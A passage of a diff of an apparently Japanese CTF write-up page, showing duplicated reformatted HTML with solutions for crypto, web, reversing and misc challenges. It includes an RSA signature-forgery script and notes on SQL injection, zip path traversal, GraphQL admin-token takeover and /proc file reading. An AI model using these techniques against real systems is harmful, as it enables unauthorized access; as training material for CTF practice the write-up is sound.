 \begin{array}{cccc}
-c^1_{1,1} - c^2_{1,1} &amp; c^1_{1,2} - c^2_{1,2} &amp; \dots &amp; c^1_{1,44} - c^2_{1,44} \\\
-\vdots &amp; \ddots &amp;  &amp; \vdots \\\
-\vdots &amp;  &amp; \ddots  &amp; \vdots \\\
-c^1_{44,1} - c^2_{44,1} &amp; c^1_{44,2} - c^2_{44,2} &amp; \dots &amp; c^1_{44,44} - c^2_{44,44}
+c^1_{1,1} - c^2_{1,1} & c^1_{1,2} - c^2_{1,2} & \dots & c^1_{1,44} - c^2_{1,44} \\\
+\vdots & \ddots & & \vdots \\\
+\vdots & & \ddots & \vdots \\\
+c^1_{44,1} - c^2_{44,1} & c^1_{44,2} - c^2_{44,2} & \dots & c^1_{44,44} - c^2_{44,44}
 \end{array}
 \right]
 \left[
@@ -466,9 +240,7 @@ x_{1} \\\
 x_{44}
 \end{array}
 \right]
-$$</p>
-<p>したがってあとは\(C_1 - C_2\)の逆行列から<code>FLAG</code>を得られる。</p>
-<pre><code class="language-python">import os
+$$</p><p>したがってあとは\(C_1 - C_2\)の逆行列から<code>FLAG</code>を得られる。</p><pre><code class=language-python>import os
 import json
 import numpy as np
 from numpy.linalg import inv
@@ -505,10 +277,7 @@ flag_int = np.around(flag).astype(int).tolist()[0]
 print(flag)
 
 print( &quot;&quot;.join([ chr(i) for i in flag_int ]) )
-</code></pre>
-<h3 id="rsa-calc">RSA Calc</h3>
-<p>下記のようなプログラムが動いている。</p>
-<pre><code class="language-python">from Crypto.Util.number import *
+</code></pre><h3 id=rsa-calc>RSA Calc</h3><p>下記のようなプログラムが動いている。</p><pre><code class=language-python>from Crypto.Util.number import *
 from params import p, q, flag
 import binascii
 import sys
@@ -605,29 +374,10 @@ def main():
 if __name__ == '__main__':
     signal.alarm(60)
     main()
-</code></pre>
-<p><code>F</code>または<code>1337</code>を含まないならば、任意の文字列に署名してくれる。そしてスタック署名されたスタックマシンの命令列を実行し、狙ったところに入れる（そのために<code>F</code>や<code>1337</code>が必要）ことができればフラグが入手できる。
-RSAの準同型性を利用した。端的にいうと、いまRSAのパラメーターとして\(N, e, d\)と、任意の平文\(m_1, m_2\)があるとして、RSAは次がなりたつ。</p>
-<p>$$
+</code></pre><p><code>F</code>または<code>1337</code>を含まないならば、任意の文字列に署名してくれる。そしてスタック署名されたスタックマシンの命令列を実行し、狙ったところに入れる（そのために<code>F</code>や<code>1337</code>が必要）ことができればフラグが入手できる。
+RSAの準同型性を利用した。端的にいうと、いまRSAのパラメーターとして\(N, e, d\)と、任意の平文\(m_1, m_2\)があるとして、RSAは次がなりたつ。</p><p>$$
 \text{Sign}_{d, N}(m_1 \times m_2) \equiv \text{Sign}_{d, N}(m_1) \times \text{Sign}_{d, N}(m_2) \bmod N
-$$</p>
-<p>よって次のようなプランでアタックする。</p>
-<ol>
-<li>\(2\)に署名させる</li>
-<li>\(\frac{\mathtt{1337,F}}{2}\)した値に署名させる
-<ul>
-<li>偶然<code>1337,F</code>の数値表現は\(2\)で割り切ることができた</li>
-</ul>
-</li>
-<li>上記2つの署名をかけ算して\(N\)で割った余りをとる
-<ul>
-<li>これが<code>1337,F</code>の署名となっている</li>
-</ul>
-</li>
-<li><code>1337,F</code>を実行し、署名として（3）で得られたものを入れる</li>
-</ol>
-<p>これをやるのが下記のプログラムである。</p>
-<pre><code class="language-python">import numpy as np
+$$</p><p>よって次のようなプランでアタックする。</p><ol><li>\(2\)に署名させる</li><li>\(\frac{\mathtt{1337,F}}{2}\)した値に署名させる<ul><li>偶然<code>1337,F</code>の数値表現は\(2\)で割り切ることができた</li></ul></li><li>上記2つの署名をかけ算して\(N\)で割った余りをとる<ul><li>これが<code>1337,F</code>の署名となっている</li></ul></li><li><code>1337,F</code>を実行し、署名として（3）で得られたものを入れる</li></ol><p>これをやるのが下記のプログラムである。</p><pre><code class=language-python>import numpy as np
 import re
 import socket
 from Crypto.Util.number import *
@@ -689,325 +439,31 @@ sig = (format(signature_command, 'x')).encode(&quot;ascii&quot;)
 s.sendall(sig + b'\n\n')
 
 print(s.recv(2024).decode(&quot;utf-8&quot;))
-</code></pre>
-<h2 id="web">Web</h2>
-<h3 id="spy">Spy</h3>
-<p>ユーザの有無でサーバの応答時間が変わるので、全ユーザー試して列挙。</p>
-<h3 id="tweetstore">Tweetstore</h3>
-<p>SQLインジェクションでユーザ情報を表示する。</p>
-<h3 id="unzip">unzip</h3>
-<p>解凍後に../../../../../../../../../flag.txtを展開するzipをアップロード。</p>
-<h3 id="profiler">profiler</h3>
-<p>Burp Suiteで通信を覗くと、APIでGraphQLが使われていることがわかる。
+</code></pre><h2 id=web>Web</h2><h3 id=spy>Spy</h3><p>ユーザの有無でサーバの応答時間が変わるので、全ユーザー試して列挙。</p><h3 id=tweetstore>Tweetstore</h3><p>SQLインジェクションでユーザ情報を表示する。</p><h3 id=unzip>unzip</h3><p>解凍後に../../../../../../../../../flag.txtを展開するzipをアップロード。</p><h3 id=profiler>profiler</h3><p>Burp Suiteで通信を覗くと、APIでGraphQLが使われていることがわかる。
 AltairというChrome拡張機能でGraphQLのクエリを送ることができる。
 利用できそうなAPIを探すと、他の人のprofileが覗けそうなsomeoneとトークンをアップデートできそうなupdateTokenが見つかる。
 someoneでuid:adminを指定してリクエストすると、adminのTokenが参照できる。
 ここで手に入れた値をupdateTokenで指定すると、自分のTokenがadminと同じトークンに変更できる。
-この状態でflagページにアクセスすると、flagが表示される。</p>
-<h2 id="reversing">Reversing</h2>
-<h3 id="mask">mask</h3>
-<p>Ghidraに食わせると、flagの各文字を&amp; 0x75した文字列と&amp; 0xebした文字列が見つかるので、これらの論理和を計算。</p>
-<h3 id="yakisoba">yakisoba</h3>
-<p>Ghidraに食わせると、flagの各文字を判定する関数が見つかるので、読む。</p>
-<h3 id="ghost">ghost</h3>
-<p>実装が与えられているので、総当たり。</p>
-<h2 id="misc">Misc</h2>
-<h3 id="welcome">Welcome</h3>
-<p>Discordを見る。</p>
-<h3 id="emoemoencode">emoemoencode</h3>
-<p>絵文字の文字コードの下2桁をasciiにする。</p>
-<h3 id="readme">readme</h3>
-<p>/proc/self/environでpwdが/home/ctf/serverとわかるので、/proc/self/cwd/../flagを渡し、相対パスでアクセス。</p>
-
-    </div>
-</article>
-
-
-
-
-            </div>
-            <aside class="col-12 col-md-3 float-left sidebar">
-    
-    <div class="sidebar-item sidebar-pages">
-        <h3>Pages</h3>
-        <ul>
-            
-            <li>
-                <a href="/">Home</a>
-            </li>
-            
-            <li>
-                <a href="/about/">About</a>
-            </li>
-            
-            <li>
-                <a href="/books/">Publication</a>
-            </li>
-            
-            <li>
-                <a href="/index.xml">RSS</a>
-            </li>
-            
-        </ul>
-    </div>
-    
-    <div class="sidebar-item sidebar-links">
-        <h3>Links</h3>
-        <ul>
-            
-            <li>
-                <a href="https://github.com/urandom-ctf" target="_blank"><span>GitHub</span></a>
-            </li>
-            
-        </ul>
-    </div>
-    
-    <div class="sidebar-item sidebar-tags">
-        <h3>Tags</h3>
-        <div>
-            
-            <span>
-                <a href="/tags/ctf/">CTF</a>
-            </span>
-            
-            <span>
-                <a href="/tags/e-book/">E-Book</a>
-            </span>
-            
-            <span>
-                <a href="/tags/misc/">Misc</a>
-            </span>
-            
-            <span>
-                <a href="/tags/publication/">Publication</a>
-            </span>
-            
-            <span>
-                <a href="/tags/seccon/">SECCON</a>
-            </span>
-            
-            <span>
-                <a href="/tags/tech/">Tech</a>
-            </span>
-            
-            <span>
-                <a href="/tags/tmctf/">TMCTF</a>
-            </span>
-            
-            <span>
-                <a href="/tags/write-ups/">Write-Ups</a>
-            </span>
-            
-        </div>
-    </div>
-    <div class="sidebar-item sidebar-toc">
-        <h3>Table of Contents</h3><nav id="TableOfContents">
-  <ul>
-    <li><a href="#pwn">Pwn</a>
-      <ul>
-        <li><a href="#beginners-stack">Beginner&rsquo;s Stack</a></li>
-        <li><a href="#beginners-heap">Beginner&rsquo;s Heap</a></li>
-      </ul>
-    </li>
-    <li><a href="#crypto">Crypto</a>
-      <ul>
-        <li><a href="#rb">R&amp;B</a></li>
-        <li><a href="#noisy-equations">Noisy equations</a></li>
-        <li><a href="#rsa-calc">RSA Calc</a></li>
-      </ul>
-    </li>
-    <li><a href="#web">Web</a>
-      <ul>
-        <li><a href="#spy">Spy</a></li>
-        <li><a href="#tweetstore">Tweetstore</a></li>
-        <li><a href="#unzip">unzip</a></li>
-        <li><a href="#profiler">profiler</a></li>
-      </ul>
-    </li>
-    <li><a href="#reversing">Reversing</a>
-      <ul>
-        <li><a href="#mask">mask</a></li>
-        <li><a href="#yakisoba">yakisoba</a></li>
-        <li><a href="#ghost">ghost</a></li>
-      </ul>
-    </li>
-    <li><a href="#misc">Misc</a>
-      <ul>
-        <li><a href="#welcome">Welcome</a></li>
-        <li><a href="#emoemoencode">emoemoencode</a></li>
-        <li><a href="#readme">readme</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav></div>
-</aside>
-
-        </div>
-        <div class="btn">
-    <div class="btn-menu" id="btn-menu">
-        <i class="iconfont icon-grid-sharp"></i>
-    </div>
-    <div class="btn-toggle-mode">
-        <i class="iconfont icon-contrast-sharp"></i>
-    </div>
-    <div class="btn-scroll-top">
-        <i class="iconfont icon-chevron-up-circle-sharp"></i>
-    </div>
-</div>
-<aside class="sidebar-mobile" style="display: none;">
-  <div class="sidebar-wrapper">
-    
-    <div class="sidebar-item sidebar-pages">
-        <h3>Pages</h3>
-        <ul>
-            
-            <li>
-                <a href="/">Home</a>
-            </li>
-            
-            <li>
-                <a href="/about/">About</a>
-            </li>
-            
-            <li>
-                <a href="/books/">Publication</a>
-            </li>
-            
-            <li>
-                <a href="/index.xml">RSS</a>
-            </li>
-            
-        </ul>
-    </div>
-    
-    <div class="sidebar-item sidebar-links">
-        <h3>Links</h3>
-        <ul>
-            
-            <li>
-                <a href="https://github.com/urandom-ctf" target="_blank"><span>GitHub</span></a>
-            </li>
-            
-        </ul>
-    </div>
-    
-    <div class="sidebar-item sidebar-tags">
-        <h3>Tags</h3>
-        <div>
-            
-            <span>
-                <a href="/tags/ctf/">CTF</a>
-            </span>
-            
-            <span>
-                <a href="/tags/e-book/">E-Book</a>
-            </span>
-            
-            <span>
-                <a href="/tags/misc/">Misc</a>
-            </span>
-            
-            <span>
-                <a href="/tags/publication/">Publication</a>
-            </span>
-            
-            <span>
-                <a href="/tags/seccon/">SECCON</a>
-            </span>
-            
-            <span>
-                <a href="/tags/tech/">Tech</a>
-            </span>
-            
-            <span>
-                <a href="/tags/tmctf/">TMCTF</a>
-            </span>
-            
-            <span>
-                <a href="/tags/write-ups/">Write-Ups</a>
-            </span>
-            
-        </div>
-    </div>
-    
-    
-    
-    <div class="sidebar-item sidebar-toc">
-        <h3>Table of Contents</h3>
-        <nav id="TableOfContents">
-  <ul>
-    <li><a href="#pwn">Pwn</a>
-      <ul>
-        <li><a href="#beginners-stack">Beginner&rsquo;s Stack</a></li>
-        <li><a href="#beginners-heap">Beginner&rsquo;s Heap</a></li>
-      </ul>
-    </li>
-    <li><a href="#crypto">Crypto</a>
-      <ul>
-        <li><a href="#rb">R&amp;B</a></li>
-        <li><a href="#noisy-equations">Noisy equations</a></li>
-        <li><a href="#rsa-calc">RSA Calc</a></li>
-      </ul>
-    </li>
-    <li><a href="#web">Web</a>
-      <ul>
-        <li><a href="#spy">Spy</a></li>
-        <li><a href="#tweetstore">Tweetstore</a></li>
-        <li><a href="#unzip">unzip</a></li>
-        <li><a href="#profiler">profiler</a></li>
-      </ul>
-    </li>
-    <li><a href="#reversing">Reversing</a>
-      <ul>
-        <li><a href="#mask">mask</a></li>
-        <li><a href="#yakisoba">yakisoba</a></li>
-        <li><a href="#ghost">ghost</a></li>
-      </ul>
-    </li>
-    <li><a href="#misc">Misc</a>
-      <ul>
-        <li><a href="#welcome">Welcome</a></li>
-        <li><a href="#emoemoencode">emoemoencode</a></li>
-        <li><a href="#readme">readme</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-    </div>
-    
-    
-  </div>
-</aside>
-    </main>
-
-    <footer>
-    <div class="container-lg clearfix">
-        <div class="col-12 footer">
-            
-            <span>&copy; 2015-2024
-                <a href="https://urandom.team/">urandom</a>
-                All rights reserved.
-                 | <a href="https://github.com/urandom-ctf/urandom-ctf.github.io">Source code</a> 
-                | Powered by <a href="https://github.com/dsrkafuu/hugo-theme-fuji/"
-                   target="_blank">Fuji-v2</a> &amp; <a href="https://gohugo.io/"
-                                                    target="_blank">Hugo</a> 
-            </span>
-        </div>
-    </div>
-</footer>
-
-    
-<script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
-<script defer src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script>
-<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js"></script>
-<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js"></script>
-
-
-
-<script defer src="/assets/js/fuji.min.js"></script>
-
-
-
-</body>
-
-</html>
+この状態でflagページにアクセスすると、flagが表示される。</p><h2 id=reversing>Reversing</h2><h3 id=mask>mask</h3><p>Ghidraに食わせると、flagの各文字を& 0x75した文字列と& 0xebした文字列が見つかるので、これらの論理和を計算。</p><h3 id=yakisoba>yakisoba</h3><p>Ghidraに食わせると、flagの各文字を判定する関数が見つかるので、読む。</p><h3 id=ghost>ghost</h3><p>実装が与えられているので、総当たり。</p><h2 id=misc>Misc</h2><h3 id=welcome>Welcome</h3><p>Discordを見る。</p><h3 id=emoemoencode>emoemoencode</h3><p>絵文字の文字コードの下2桁をasciiにする。</p><h3 id=readme>readme</h3><p>/proc/self/environでpwdが/home/ctf/serverとわかるので、/proc/self/cwd/../flagを渡し、相対パスでアクセス。</p></div></article></div><aside class="col-12 col-md-3 float-left sidebar"><div class="sidebar-item sidebar-pages"><h3>Pages</h3><ul><li><a href=/>Home</a></li><li><a href=/about/>About</a></li><li><a href=/books/>Publication</a></li><li><a href=/index.xml>RSS</a></li></ul></div><div class="sidebar-item sidebar-links"><h3>Links</h3><ul><li><a href=https://github.com/urandom-ctf target=_blank><span>GitHub</span></a></li></ul></div><div class="sidebar-item sidebar-tags"><h3>Tags</h3><div><span><a href=/tags/ctf/>CTF</a></span>
+<span><a href=/tags/e-book/>E-book</a></span>
+<span><a href=/tags/misc/>Misc</a></span>
+<span><a href=/tags/publication/>Publication</a></span>
+<span><a href=/tags/seccon/>SECCON</a></span>
+<span><a href=/tags/tech/>tech</a></span>
+<span><a href=/tags/tmctf/>TMCTF</a></span>
+<span><a href=/tags/write-ups/>Write-ups</a></span></div></div><div class="sidebar-item sidebar-toc"><h3>Table of Contents</h3><nav id=TableOfContents><ul><li><a href=#pwn>Pwn</a><ul><li><a href=#beginners-stack>Beginner&rsquo;s Stack</a></li><li><a href=#beginners-heap>Beginner&rsquo;s Heap</a></li></ul></li><li><a href=#crypto>Crypto</a><ul><li><a href=#rb>R&amp;B</a></li><li><a href=#noisy-equations>Noisy equations</a></li><li><a href=#rsa-calc>RSA Calc</a></li></ul></li><li><a href=#web>Web</a><ul><li><a href=#spy>Spy</a></li><li><a href=#tweetstore>Tweetstore</a></li><li><a href=#unzip>unzip</a></li><li><a href=#profiler>profiler</a></li></ul></li><li><a href=#reversing>Reversing</a><ul><li><a href=#mask>mask</a></li><li><a href=#yakisoba>yakisoba</a></li><li><a href=#ghost>ghost</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#welcome>Welcome</a></li><li><a href=#emoemoencode>emoemoencode</a></li><li><a href=#readme>readme</a></li></ul></li></ul></nav></div></aside></div><div class=btn><div class=btn-menu id=btn-menu><i class="iconfont icon-grid-sharp"></i></div><div class=btn-toggle-mode><i class="iconfont icon-contrast-sharp"></i></div><div class=btn-scroll-top><i class="iconfont icon-chevron-up-circle-sharp"></i></div></div><aside class=sidebar-mobile style=display:none><div class=sidebar-wrapper><div class="sidebar-item sidebar-pages"><h3>Pages</h3><ul><li><a href=/>Home</a></li><li><a href=/about/>About</a></li><li><a href=/books/>Publication</a></li><li><a href=/index.xml>RSS</a></li></ul></div><div class="sidebar-item sidebar-links"><h3>Links</h3><ul><li><a href=https://github.com/urandom-ctf target=_blank><span>GitHub</span></a></li></ul></div><div class="sidebar-item sidebar-tags"><h3>Tags</h3><div><span><a href=/tags/ctf/>CTF</a></span>
+<span><a href=/tags/e-book/>E-book</a></span>
+<span><a href=/tags/misc/>Misc</a></span>
+<span><a href=/tags/publication/>Publication</a></span>
+<span><a href=/tags/seccon/>SECCON</a></span>
+<span><a href=/tags/tech/>tech</a></span>
+<span><a href=/tags/tmctf/>TMCTF</a></span>
+<span><a href=/tags/write-ups/>Write-ups</a></span></div></div><div class="sidebar-item sidebar-toc"><h3>Table of Contents</h3><nav id=TableOfContents><ul><li><a href=#pwn>Pwn</a><ul><li><a href=#beginners-stack>Beginner&rsquo;s Stack</a></li><li><a href=#beginners-heap>Beginner&rsquo;s Heap</a></li></ul></li><li><a href=#crypto>Crypto</a><ul><li><a href=#rb>R&amp;B</a></li><li><a href=#noisy-equations>Noisy equations</a></li><li><a href=#rsa-calc>RSA Calc</a></li></ul></li><li><a href=#web>Web</a><ul><li><a href=#spy>Spy</a></li><li><a href=#tweetstore>Tweetstore</a></li><li><a href=#unzip>unzip</a></li><li><a href=#profiler>profiler</a></li></ul></li><li><a href=#reversing>Reversing</a><ul><li><a href=#mask>mask</a></li><li><a href=#yakisoba>yakisoba</a></li><li><a href=#ghost>ghost</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#welcome>Welcome</a></li><li><a href=#emoemoencode>emoemoencode</a></li><li><a href=#readme>readme</a></li></ul></li></ul></nav></div></div></aside></main><footer><div class="container-lg clearfix"><div class="col-12 footer"><span>&copy; 2015-2024
+<a href=https://urandom.team>urandom</a>
+All rights reserved.
+| <a href=https://github.com/urandom-ctf/urandom-ctf.github.io>Source code</a>
+| Powered by <a href=https://github.com/dsrkafuu/hugo-theme-fuji/ target=_blank>Fuji-v2</a> & <a href=https://gohugo.io/ target=_blank>Hugo</a></span></div></div></footer><script defer src=https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js></script>
+<script defer src=/assets/js/fuji.min.js></script></body></html>
